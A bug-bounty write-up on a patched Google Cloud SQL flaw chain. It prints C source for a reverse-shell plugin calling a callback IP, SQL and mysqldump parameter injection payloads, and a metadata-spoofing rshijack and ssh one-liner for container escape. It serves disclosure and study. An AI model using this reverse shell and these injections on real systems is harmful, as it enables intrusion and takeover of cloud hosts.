---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-08-18_how-to-contact-google-sre-dropping-a-shell-in-cloud-sql.md
original_filename: 2020-08-18_how-to-contact-google-sre-dropping-a-shell-in-cloud-sql.md
title: 'How to contact Google SRE: Dropping a shell in cloud SQL'
category: documents
detected_topics:
- command-injection
- access-control
- ssrf
- sqli
- path-traversal
- mfa
tags:
- imported
- documents
- command-injection
- access-control
- ssrf
- sqli
- path-traversal
- mfa
language: en
raw_sha256: 5546d879e15bb215a2962596b1548f08d8a7398ee177ae886221515e16eaee53
text_sha256: b974e9e0340bb4b5c558ffe1597aa6fbe70fcc3ad53620e67f15e0484a56d5c0
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# How to contact Google SRE: Dropping a shell in cloud SQL

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-08-18_how-to-contact-google-sre-dropping-a-shell-in-cloud-sql.md
- Source Type: markdown
- Detected Topics: command-injection, access-control, ssrf, sqli, path-traversal, mfa
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `5546d879e15bb215a2962596b1548f08d8a7398ee177ae886221515e16eaee53`
- Text SHA256: `b974e9e0340bb4b5c558ffe1597aa6fbe70fcc3ad53620e67f15e0484a56d5c0`


## Content

---
title: "How to contact Google SRE: Dropping a shell in cloud SQL"
page_title: "How to contact Google SRE: Dropping a shell in cloud SQL – Offensi"
url: "https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/"
final_url: "https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/"
authors: ["wtm@offensi.com (@wtm_offensi)", "Ezequiel Pereira (@epereiralopez)"]
programs: ["Google"]
bugs: ["SQL injection", "Privilege escalation", "Parameter injection", "RCE"]
publication_date: "2020-08-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4308
---

**Note** : The vulnerabilities that are discussed in this post were patched quickly and properly by Google. We support responsible disclosure. The research that resulted in this post was done by me and my bughunting friend Ezequiel Pereira. You can read this same post on his [website](https://www.ezequiel.tech/2020/08/dropping-shell-in.html)

[Follow wtm](https://twitter.com/wtm_offensi?ref_src=twsrc%5Etfw)

### About Cloud SQL

Google Cloud SQL is a fully managed relational database service. Customers can deploy a SQL, PostgreSQL or MySQL server which is secured, monitored and updated by Google. More demanding users can easily scale, replicate or configure high-availability. By doing so users can focus on working with the database, instead of dealing with all the previously mentioned complex tasks. Cloud SQL databases are accessible by using the applicable command line utilities or from any application hosted around the world. This write-up covers vulnerabilities that we have discovered in the MySQL versions 5.6 and 5.7 of Cloud SQL.

#### Limitations of a managed MySQL instance

Because Cloud SQL is a fully managed service, users don’t have access to certain features. In particular, the SUPER and FILE privilege. In MySQL, the SUPER privilege is reserved for system administration related tasks and the FILE privilege for reading/writing to and from files on the server running the MySQL daemon. Any attacker who can get a hold of these privileges can easily compromise the server. 

Furthermore, mysqld port 3306 is not reachable from the public internet by default due to firewalling. When a user connects to MySQL using the gcloud client (‘gcloud sql connect <instance>’), the user’s ip address is temporarily added to the whitelist of hosts that are allowed to connect. 

Users do get access to the ‘root’@’%’ account. In MySQL users are defined by a username AND hostname. In this case the user ‘root’ can connect from any host (‘%’). 

### Elevating privileges

#### Bug 1. Obtaining FILE privileges through SQL injection

When looking at the web-interface of the MySQL instance in the Google Cloud console, we notice several features are presented to us. We can create a new database, new users and we can import and export databases from and to storage buckets. While looking at the export feature, we noticed we can enter a custom query when doing an export to a CSV file. 

![](https://lh5.googleusercontent.com/3aci3M0rgdPVUkEoKwZ1YsSQIM0V0Nr84dwvo1T6k4uIpaxjHLC4tGpT8XPTxBcQpI7Lb9dRhn7lJncD-1AlAxO2WdODMmtQzG7-9dS_5kr2X1Ts7hYiJkUUtA7OXg44BNK7zpMI)

Because we want to know how Cloud SQL is doing the CSV export, we intentionally enter the incorrect query “SELECT * FROM evil AND A TYPO HERE”. This query results in the following error: 
  
  
  Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'AND A TYPO HERE INTO OUTFILE '/mysql/tmp/savedata-1589274544663130747.csv' CHARA' at line 1

The error clearly shows that the user that is connecting to MySQL to do the export has FILE privileges. It attempts to select data to temporarily store it into the ‘/mysql/tmp’ directory before exporting it to a storage bucket. When we run ‘SHOW VARIABLES’ from our MySQL client we notice that ‘/mysql/tmp’ is the secure_file_priv directory, meaning that ‘/mysql/tmp’ is the only path where a user with FILE privileges is allowed to store files. 

By adding the MySQL comment character (#) to the query we can perform SQL injection with FILE privileges: 
  
  
  SELECT * FROM ourdatabase INTO ‘/mysql/tmp/evilfile’ #

An attacker could now craft a malicious database and select the contents of a table but can only write the output to a file under ‘/mysql/tmp’. This does not sound very promising so far. 

#### Bug 2. Parameter injection in mysqldump

When doing a regular export of a database we notice that the end result is a .sql file which is dumped by the ‘mysqldump’ tool. This can easily be confirmed when you open an exported database from a storage bucket, the first lines of the dump reveal the command and version: 
  
  
  -- MySQL dump 10.13  Distrib 5.7.25, for Linux (x86_64)
  --
  -- Host: localhost  Database: mysql
  -- ------------------------------------------------------
  -- Server version	5.7.25-google-log<!-- wp:html -->
  -- MySQL dump 10.13&nbsp; Distrib 5.7.25, for Linux (x86_64)
  5.7.25-google-log</em></p>
  

Now we know that when we run the export tool, the Cloud SQL API somehow invokes mysqldump and stores the database before moving it to a storage bucket. 

When we intercept the API call that is responsible for the export with Burp we see that the database (‘mysql’ in this case) is passed as a parameter: 

![](https://lh5.googleusercontent.com/kwODJFjPA4RcItjahsAotTJd7YIP2f2PxvsWuObMgjMmdEma0r99rFbotvdEE2Ewb4JgWQcasgneqYyR3xuDwN1kayD7VjC4WJJTnMDXYteWPINj4TXQSNaD-MiHQWa9ZTmcBRld)

An attempt to modify the database name in the API call from ‘mysql’ into ‘–help’ results into something that surprised us. The mysqldump help is dumped into a .sql file in a storage bucket. 
  
  
  mysqldump  Ver 10.13 Distrib 5.7.25, for Linux (x86_64)
  Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
  
  …
  
  Dumping structure and contents of MySQL databases and tables.
  Usage: mysqldump [OPTIONS] database [tables]
  OR  mysqldump [OPTIONS] --databases [OPTIONS] DB1 [DB2 DB3...]
  OR  mysqldump [OPTIONS] --all-databases [OPTIONS]
  
  ...
  --print-defaults  Print the program argument list and exit.
  --no-defaults  Don't read default options from any option file,
  except for login file.
  --defaults-file=#  Only read default options from the given file #.
  

Testing for command injection resulted into failure however. It seems like mysqldump is passed as the first argument to execve(), rendering a command injection attack impossible. 

We now can however pass arbitrary parameters to mysqldump as the ‘–help’ command illustrates. 

#### Crafting a malicious database

Among a lot of, in this case, useless parameters mysqldump has to offer, two of them appear to be standing out from the rest, namely the ‘–plugin-dir’ and the ‘–default-auth’ parameter. 

The –plugin-dir parameter allows us to pass the directory where client side plugins are stored. The –default-auth parameter specifies which authentication plugin we want to use. Remember that we could write to ‘/mysql/tmp’? What if we write a malicious plugin to ‘/mysql/tmp’ and load it with the aforementioned mysqldump parameters? We must however prepare the attack locally. We need a malicious database that we can import into Cloud SQL, before we can export any useful content into ‘/mysql/tmp’. We prepare this locally on a MySQL server running on our desktop computers. 

First we write a malicious shared object which spawns a reverse shell to a specified IP address. We overwrite the __init_ function:
  
  
  #include <sys/types.h>
  #include <unistd.h>
  #include <stdio.h>
  #include <stdlib.h>
  #include <sys/socket.h>
  #include <unistd.h>
  #include <fcntl.h>
  #include <netinet/in.h>
  #include <netdb.h>
  #include <arpa/inet.h>
  #include <netinet/ip.h>
  
  void _init() {
  FILE * fp;
  int fd; 
  int sock; 
  int port = 1234; 
  
  struct sockaddr_in addr;
  char * callback = "123.123.123.123";
  char mesg[]= "Shell on speckles>\n";
  char shell[] = "/bin/sh";
  
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = inet_addr(callback);
  fd = socket(AF_INET, SOCK_STREAM, 0);
  connect(fd, (struct sockaddr*)&addr, sizeof(addr));
  
  send(fd, mesg, sizeof(mesg), 0);
  
  dup2(fd, 0); 
  dup2(fd, 1); 
  dup2(fd, 2); 
  execl(shell, "sshd", 0, NULL);  
  close(fd);
  }
  
  

We compile it into a shared object with the following command: 
  
  
  gcc -fPIC -shared -o evil_plugin.so evil_plugin.c -nostartfiles

On our locally running database server, we now insert the evil_plugin.so file into a longblob table: 
  
  
  mysql -h localhost -u root
  
  >CREATE DATABASE files
  >USE files
  > CREATE TABLE `data` (
  `exe` longblob
  ) ENGINE=MyISAM DEFAULT CHARSET=binary;
  > insert into data VALUES(LOAD_FILE('evil_plugin.so'));
  

Our malicious database is now done! We export it to a .sql file with mysqldump: 
  
  
  Mysqldump -h localhost -u root files > files.sql 

Next we store files.sql in a storage bucket. After that, we create a database called ‘files’ in Cloud SQL and import the malicious database dump into it. 

#### Dropping a Shell

With everything prepared, all that’s left now is writing the evil_plugin.so to /mysql/tmp before triggering the reverse shell by injecting ’–plugin-dir=/mysql/tmp/ –default-auth=evil_plugin’ as parameters to mysqldump that runs server-side. 

To accomplish this we once again run the CSV export feature, this time against the ‘files’ database while passing the following data as it’s query argument: 
  
  
  SELECT * FROM data INTO DUMPFILE '/mysql/tmp/evil_plugin.so' #

Now we run a regular export against the MySQL database again, and modify the request to the API with Burp to pass the correct parameters to mysqldump: 

![](https://lh3.googleusercontent.com/NFhsohbW98RToBXX1fwFHTp7Pv2Hg-XOhVxZ-l3QIAJ9GErN9-0Ow6uLZEV9cECMfrmEpazLJ8ERif6ByFsyk9nCe3gyw7LDgPjiy5CikoZq9Dnx1f45u9l_I5fbJnn9zhIg7yXW)

Success! On our listening netcat we are now dropped into a reverse shell.

![](https://lh3.googleusercontent.com/mLDA_770OLgc61AkO-XGHnPmt1wOjftaDOaeOxfHXmw3CxcbqbxgBs-jK0xm_gl8H9QFIWP7AKoTQe8bIZP3kgMA-hPhUhZGtS1Oz2cC4i46tYIbLv-nxL8x9C6WMrtO4QofC7YI)

#### Fun fact

Not long after we started exploring the environment we landed our shell in we noticed a new file in the /mysql/tmp directory named ‘greetings.txt’: 

![](https://lh3.googleusercontent.com/fj27Jhwn7tUZH6GpC6mwbGtXqUuUg48oZ_f3Qk6qsFt0wPu9wUVH5816sm2S5W39BSwEltr8mfAqTkEO2UAGszDe8wmh8rt7Yxv7DHUuR9TOT-_7Mphyh_xg8CdjUhgwTuX8fOP_)

Google SRE (Site Reliability Engineering) appeared to be on to us 🙂 It appeared that during our attempts we crashed a few of our own instances which alarmed them. We got into touch with SRE via e-mail and informed them about our little adventure and they kindly replied back.

However our journey did not end here, since it appeared that we are trapped inside a Docker container, running nothing more than the bare minimum that’s needed to export our database. We needed to find a way to escape and we needed it quickly, SRE knows what we are doing and now Google might be working on a patch. 

#### Escaping to the host

The container that we had access to was running unprivileged, meaning that no easy escape was available. Upon inspecting the network configuration we noticed that we had access to eth0, which in this case had the internal IP address of the container attached to it. 

![](https://lh4.googleusercontent.com/3eETAGk9NxxcfxY1CUeJs7kfXHGA-3HuVWqBGSm9WntJAa1i_t7F2Wl4U4slOmUDXBtu43aE-he79tJCvr14_DXLPtz-Gc2C2OLDXrZlAxklFvx9W0TjfqKR4xA0V7qa0owJTI0g)

This was due to the fact that the container was configured with the Docker host networking driver (–network=host). When running a docker container without any special privileges it’s network stack is isolated from the host. When you run a container in host network mode that’s no longer the case. The container does no longer get its own IP address, but instead binds all services directly to the hosts IP. Furthermore we can intercept ALL network traffic that the host is sending and receiving on eth0 (tcpdump -i eth0). 

#### The Google Guest Agent (/usr/bin/google_guest_agent)

When you inspect network traffic on a regular Google Compute Engine instance you will see a lot of plain HTTP requests being directed to the metadata instance on 169.254.169.254. One service that makes such requests is the Google Guest Agent. It runs by default on any GCE instance that you configure. An example of the requests it makes can be found below.

![](https://lh6.googleusercontent.com/m9abubapRGEIrKpVzczT3yF0zpSwuoMHB-qBH0PdhAcyVbaEgJP2XGaVOIk9LXQAstlmELU87Z0TqqebmL9qyufrNo5iWuSqHm0e08N5UYCj-avbWJFTf74y350eNgGxIP_IHOEf)

The Google Guest Agent monitors the metadata for changes. One of the properties it looks for is the SSH public keys. When a new public SSH key is found in the metadata, the guest agent will write this public key to the user’s .authorized_key file, creating a new user if necessary and adding it to sudoers.

The way the Google Guest Agent monitors for changes is through a call to retrieve all metadata values recursively (GET /computeMetadata/v1/?recursive=true), indicating to the metadata server to only send a response when there is any change with respect to the last retrieved metadata values, identified by its Etag (wait_for_change=true&last_etag=<ETAG>).

This request also includes a timeout (timeout_sec=<TIME>), so if a change does not occur within the specified amount of time, the metadata server responds with the unchanged values.

#### Executing the attack

Taking into consideration the access to the host network, and the behavior of the Google Guest Agent, we decided that spoofing the Metadata server SSH keys response would be the easiest way to escape our container.

Since ARP spoofing does not work on Google Compute Engine networks, we used our own modified version of [rshijack](https://github.com/kpcyrd/rshijack) ([diff](https://github.com/kpcyrd/rshijack/compare/master...ezequielpereira:master)) to send our spoofed response.

This modified version of rshijack allowed us to pass the ACK and SEQ numbers as command-line arguments, saving time and allowing us to spoof a response before the real Metadata response came.

We also wrote a [small Shell script](https://gist.github.com/ezequielpereira/914c2aae463409e785071213b059f96c#file-fakedata-sh) that would return a specially crafted payload that would trigger the Google Guest Agent to create the user “wouter”, with our own public key in its authorized_keys file.

This script receives the ETag as a parameter, since by keeping the same ETag, the Metadata server wouldn’t immediately tell the Google Guest Agent that the metadata values were different on the next response, instead waiting the specified amount of seconds in _timeout_sec_.

To achieve the spoofing, we watched requests to the Metadata server with tcpdump (_tcpdump -S -i eth0 ‘host 169.254.169.254 and port 80’ &_), waiting for a line that looked like this:
  
  
  <TIME> IP <LOCAL_IP>.<PORT> > 169.254.169.254.80: Flags [P.], seq <NUM>:<TARGET_ACK>, ack <TARGET_SEQ>, win <NUM>, length <NUM>: HTTP: GET /computeMetadata/v1/?timeout_sec=<SECONDS>&last_etag=<ETAG>&alt=json&recursive=True&wait_for_change=True HTTP/1.1

As soon as we saw that value, we quickly ran rshijack, with our fake Metadata response payload, and ssh’ing into the host:
  
  
  fakeData.sh <ETAG> | rshijack -q eth0 169.254.169.254:80 <LOCAL_IP>:<PORT> <TARGET_SEQ> <TARGET_ACK>; ssh -i id_rsa -o StrictHostKeyChecking=no wouter@localhost

Most of the time, we were able to type fast enough to get a successful SSH login :).

Once we accomplished that, we had full access to the host VM (Being able to execute commands as root through sudo).

#### Impact & Conclusions

Once we escaped to the host VM, we were able to fully research the Cloud SQL instance.

It wasn’t as exciting as we expected, since the host did not have much beyond the absolutely necessary stuff to properly execute MySQL and communicate with the Cloud SQL API.

One of our interesting findings was the iptables rules, since when you enable Private IP access (Which cannot be disabled afterwards), access to the MySQL port is not only added for the IP addresses of the specified VPC network, but instead added for the full 10.0.0.0/8 IP range, which includes other Cloud SQL instances.

Therefore, if a customer ever enabled Private IP access to their instance, they could be targeted by an attacker-controlled Cloud SQL instance. This could go wrong very quickly if the customer solely relied on the instance being isolated from the external world, and didn’t protect it with a proper password.

Furthermore,the Google VRP team expressed concern since it might be possible to escalate IAM privileges using the Cloud SQL service account attached to the underlying Compute Engine instance
